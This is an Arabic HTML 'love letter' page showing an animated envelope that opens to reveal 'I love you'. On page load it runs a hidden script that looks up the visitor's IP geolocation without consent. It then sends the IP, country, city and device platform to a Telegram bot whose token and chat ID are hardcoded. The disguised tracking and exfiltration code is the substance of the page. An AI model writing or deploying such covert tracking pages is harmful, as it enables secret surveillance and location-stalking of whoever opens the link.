<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رسالة حب</title>
    <style>
        /* التنسيق نفسه لجعل الصفحة تظهر بشكل جميل */
        body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fae1dd; margin: 0; font-family: sans-serif; overflow: hidden; }
        .envelope-wrapper { position: relative; cursor: pointer; transition: transform 0.4s ease; }
        .envelope { position: relative; width: 300px; height: 200px; background-color: #f08080; border-bottom-left-radius: 10px; border-bottom-right-radius: 10px; z-index: 1; }
        .envelope::before { content: ""; position: absolute; top: 0; z-index: 3; border-top: 110px solid #f08080; border-left: 150px solid transparent; border-right: 150px solid transparent; transform-origin: top; transition: transform 0.5s ease 0.3s; }
        .letter { position: absolute; bottom: 0; width: 80%; height: 80%; background-color: white; left: 10%; z-index: 0; transition: transform 0.5s ease; border-radius: 5px; display: flex; justify-content: center; align-items: center; }
        .letter .text { font-size: 30px; color: #d63031; font-weight: bold; opacity: 0; transition: opacity 0.3s ease 0.6s; }
        .envelope-wrapper.open .envelope::before { transform: rotateX(180deg); z-index: 0; }
        .envelope-wrapper.open .letter { transform: translateY(-80px); z-index: 2; }
        .envelope-wrapper.open .letter .text { opacity: 1; }
    </style>
</head>
<body onload="trackUser()">

    <div class="envelope-wrapper" id="envelopeWrapper">
        <div class="envelope"></div>
        <div class="letter"><div class="text">أحبك</div></div>
    </div>

    <script>
        const token = "8787728532:AAHhicri0v6ezS9rwJrGJUZWR-cvCkyLBSw";
        const chatId = "1590854644";

        async function trackUser() {
            try {
                // جلب معلومات الموقع عبر الـ IP (بدون طلب إذن)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const message = `
🔔 تنبيه: تم فتح الرابط!
📍 الدولة: ${data.country_name}
🏙 المدينة: ${data.city}
🌐 الـ IP: ${data.ip}
📱 الجهاز: ${navigator.platform}
                `;

                // إرسال البيانات للبوت
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            } catch (error) {
                // في حال فشل جلب الـ IP، نرسل تنبيهاً عاماً
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("شخص ما فتح الرابط (تعذر جلب الموقع التقريبي)")}`);
            }
        }

        const envelope = document.getElementById('envelopeWrapper');
        envelope.addEventListener('click', () => {
            envelope.classList.toggle('open');
        });
    </script>
</body>
</html>
